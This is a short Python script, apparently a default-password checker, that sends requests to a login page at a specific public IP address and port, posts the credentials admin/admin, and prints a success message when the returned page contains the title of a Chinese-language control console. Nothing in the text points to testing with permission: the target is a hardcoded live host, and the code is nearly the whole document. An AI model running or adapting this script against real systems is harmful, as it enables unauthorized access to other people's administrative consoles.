#http://122.227.8.222:8089/Account/Login
import requests
requests.packages.urllib3.disable_warnings()      # 关闭告警
url1 = 'http://122.227.8.222:8089/Account/Login'
url2 = 'http://122.227.8.222:8089/Account/Login'
url3 = 'http://122.227.8.222:8089/'
header1 = {
    "Content-Length":"55",
    "Accept":"application/json, text/javascript, */*",
    "X-Requested-With":"XMLHttpRequest",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded",
    "Origin":"http://122.227.8.222:8089",
    "Referer":"http://122.227.8.222:8089/Account/Login",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"zh-CN,zh;q=0.9",
    "Connection":"close",
}
header2 = {
    "Content-Length":"55",
    "Accept":"application/json, text/javascript, */*",
    "X-Requested-With":"XMLHttpRequest",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded",
    "Origin":"http://122.227.8.222:8089",
    "Referer":"http://122.227.8.222:8089/Account/Login",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"zh-CN,zh;q=0.9",
    "Connection":"close",
}
data = {
    'account':'admin',
    'password':'admin',
    'autologin':'false',
    'returnurl':''
}
# proxies = {
#     'http':'http://127.0.0.1:8080',
#     'https':'http://127.0.0.1:8080'
# }
session = requests.session()
result1 = session.get(url=url1, headers=header1, verify=False,timeout=5,data=data)
# print(result1.text)
if result1.status_code == 200:
    result2 = session.post(url=url2, headers=header2, data=data, verify=False,timeout=5)
    # print(result2.text)
    result3 = session.get(url=url3, verify=False,timeout=5)
    if "亿大利控制台" in result3.text:
        print(f"登录成功,密码为：admin")
    else:
        print(f"登录失败")